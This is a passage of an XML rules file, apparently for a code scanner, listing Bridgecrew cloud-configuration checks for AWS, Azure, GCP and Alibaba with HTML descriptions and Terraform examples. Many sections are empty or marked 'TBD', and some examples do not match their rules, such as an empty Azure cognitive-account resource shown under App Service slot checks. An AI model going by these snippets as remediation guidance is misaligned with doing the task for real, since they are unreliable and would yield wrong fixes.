<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_kinesis_firehose_delivery_stream"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-kinesis-firehose-delivery-stream"></div>Resource: aws_kinesis_firehose_delivery_stream</div><a aria-label="Skip link to Resource: aws_kinesis_firehose_delivery_stream" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_kinesis_firehose_delivery_stream"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-s3_configurationserver_side_encryptionkey_arn"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-s-3-configuration-server-side-encryption-key-arn"></div>Arguments: s3_configuration.server_side_encryption.key_arn</div><a aria-label="Skip link to Arguments: s3_configuration.server_side_encryption.key_arn" class="heading-anchor-icon fa fa-anchor" href="#arguments-s3_configurationserver_side_encryptionkey_arn"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_kinesis_firehose_delivery_stream" "pass" {
  name        = "terraform-kinesis-firehose-test-stream"
  destination = "s3"

  s3_configuration {
    role_arn   = aws_iam_role.firehose_role.arn
    bucket_arn = aws_s3_bucket.bucket.arn
  }

   server_side_encryption {
     enabled=true #default is false
     key_type = "CUSTOMER_MANAGED_CMK"
     key_arn = aws_kms_key.example.arn
   }
  tags = {
    test = "failed"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehose-delivery-streams-are-encrypted-with-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehose-delivery-streams-are-encrypted-with-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-kinesis-firehose-delivery-streams-are-encrypted-with-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_154</key>
    <name>Ensure Azure App's service slot uses the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-apps-service-slot-does-not-use-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-apps-service-slot-does-not-use-the-latest-version-of-tls-encryption"></div>Azure App's service slot does not use the latest version of TLS encryption</div><a aria-label="Skip link to Azure App's service slot does not use the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#azure-apps-service-slot-does-not-use-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_cognitive_account</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-apps-service-slot-uses-the-latest-version-of-tls-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-apps-service-slot-uses-the-latest-version-of-tls-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-apps-service-slot-uses-the-latest-version-of-tls-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_76</key>
    <name>Ensure GCP Private Google Access is enabled for IPV6</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-private-google-access-is-not-enabled-for-ipv6"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-private-google-access-is-not-enabled-for-ipv-6"></div>GCP Private Google Access is not enabled for IPV6</div><a aria-label="Skip link to GCP Private Google Access is not enabled for IPV6" class="heading-anchor-icon fa fa-anchor" href="#gcp-private-google-access-is-not-enabled-for-ipv6"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-private-google-access-is-enabled-for-ipv6' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-private-google-access-is-enabled-for-ipv6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-private-google-access-is-enabled-for-ipv6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_90</key>
    <name>Ensure GCP data flow jobs are encrypted with Customer Supplied Encryption Keys (CSEK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-data-flow-jobs-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-data-flow-jobs-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div>GCP data flow jobs are not encrypted with Customer Supplied Encryption Keys (CSEK)</div><a aria-label="Skip link to GCP data flow jobs are not encrypted with Customer Supplied Encryption Keys (CSEK)" class="heading-anchor-icon fa fa-anchor" href="#gcp-data-flow-jobs-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical data flow jobs. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_dataflow_job</li>
<li><strong>Arguments</strong>: kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_dataflow_job" "pass" {
  name              = "dataflow-job"
  template_gcs_path = "gs://my-bucket/templates/template_file"
  temp_gcs_location = "gs://my-bucket/tmp_dir"
  parameters = {
    foo = "bar"
    baz = "qux"
  }
  kms_key_name = "SecretSquirrel"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-data-flow-jobs-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-data-flow-jobs-are-encrypted-with-customer-supplied-encryption-keys-csek</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-data-flow-jobs-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_214</key>
    <name>Ensure AWS Appsync API Cache is encrypted at rest</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-appsync-api-cache-is-not-encrypted-at-rest"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-appsync-api-cache-is-not-encrypted-at-rest"></div>AWS Appsync API Cache is not encrypted at rest</div><a aria-label="Skip link to AWS Appsync API Cache is not encrypted at rest" class="heading-anchor-icon fa fa-anchor" href="#aws-appsync-api-cache-is-not-encrypted-at-rest"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-at-rest' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-at-rest</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-api-cache-is-encrypted-at-rest' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_155</key>
    <name>Ensure Azure App service slot has debugging disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-slot-does-not-have-debugging-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-slot-does-not-have-debugging-disabled"></div>Azure App service slot does not have debugging disabled</div><a aria-label="Skip link to Azure App service slot does not have debugging disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-slot-does-not-have-debugging-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-app-service-slot-has-debugging-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-app-service-slot-has-debugging-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-app-service-slot-has-debugging-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_104</key>
    <name>Ensure GCP DataFusion has stack driver logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-datafusion-does-not-have-stack-driver-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-data-fusion-does-not-have-stack-driver-logging-enabled"></div>GCP DataFusion does not have stack driver logging enabled</div><a aria-label="Skip link to GCP DataFusion does not have stack driver logging enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-datafusion-does-not-have-stack-driver-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-logging-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-logging-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-logging-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_193</key>
    <name>Ensure AWS AppSync's logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-appsyncs-logging-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-app-syncs-logging-is-disabled"></div>AWS AppSync's logging is disabled</div><a aria-label="Skip link to AWS AppSync's logging is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-appsyncs-logging-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-appsyncs-logging-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-appsyncs-logging-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-appsyncs-logging-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_196</key>
    <name>Ensure AWS Elasticache security groups are defined</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elasticache-security-groups-are-not-defined"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elasticache-security-groups-are-not-defined"></div>AWS Elasticache security groups are not defined</div><a aria-label="Skip link to AWS Elasticache security groups are not defined" class="heading-anchor-icon fa fa-anchor" href="#aws-elasticache-security-groups-are-not-defined"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-elasticache-security-groups-are-defined' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-elasticache-security-groups-are-defined</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-elasticache-security-groups-are-defined' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_200</key>
    <name>Ensure AWS Image Recipe EBS Disk are encrypted using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-image-recipe-ebs-disk-are-not-encrypted-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-image-recipe-ebs-disk-are-not-encrypted-using-a-customer-managed-key-cmk"></div>AWS Image Recipe EBS Disk are not encrypted using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS Image Recipe EBS Disk are not encrypted using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-image-recipe-ebs-disk-are-not-encrypted-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-image-recipe-ebs-disk-are-encrypted-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-image-recipe-ebs-disk-are-encrypted-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-image-recipe-ebs-disk-are-encrypted-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_208</key>
    <name>Ensure AWS MQBroker version is up to date</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mqbroker-version-is-not-up-to-date"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mq-broker-version-is-not-up-to-date"></div>AWS MQBroker version is not up to date</div><a aria-label="Skip link to AWS MQBroker version is not up to date" class="heading-anchor-icon fa fa-anchor" href="#aws-mqbroker-version-is-not-up-to-date"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This test examines the value of engine version for MQ, and flags if the version is less than the minimum required:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">versions</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="versions">minimumActiveMQ = 5.16
minimumRabbitMQ = 3.8
</code></pre></div></div>
<p>Current versions supported can be found here:<br/>
<a href="https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/activemq-version-management.html" target="_self">https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/activemq-version-management.html</a><br/>
<a href="https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/rabbitmq-version-management.html" target="_self">https://docs.aws.amazon.com/amazon-mq/latest/developer-guide/rabbitmq-version-management.html</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<p>Modify the engine version in either aws_mq_configuration or aws_mq_broker, to be higher or equal to the minimums:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_mq_configuration" "example" {
  description    = "Example Configuration"
  name           = "example"
  engine_type    = "ActiveMQ"
 + engine_version = "5.17.1"

  data = &lt;&lt;DATA
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;broker xmlns="http://activemq.apache.org/schema/core"&gt;
  &lt;plugins&gt;
    &lt;forcePersistencyModeBrokerPlugin persistenceFlag="true"/&gt;
    &lt;statisticsBrokerPlugin/&gt;
    &lt;timeStampingBrokerPlugin ttlCeiling="86400000" zeroExpirationOverride="86400000"/&gt;
  &lt;/plugins&gt;
&lt;/broker&gt;
DATA
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-version-is-up-to-date' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-version-is-up-to-date</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-mqbroker-version-is-up-to-date' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_27</key>
    <name>Ensure Alibaba Cloud KMS Key Rotation is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-kms-key-rotation-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-kms-key-rotation-is-disabled"></div>Alibaba Cloud KMS Key Rotation is disabled</div><a aria-label="Skip link to Alibaba Cloud KMS Key Rotation is disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-kms-key-rotation-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kms-key-rotation-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kms-key-rotation-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kms-key-rotation-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_38</key>
    <name>Ensure Alibaba Cloud RDS log audit is enabled</name>
    <description>
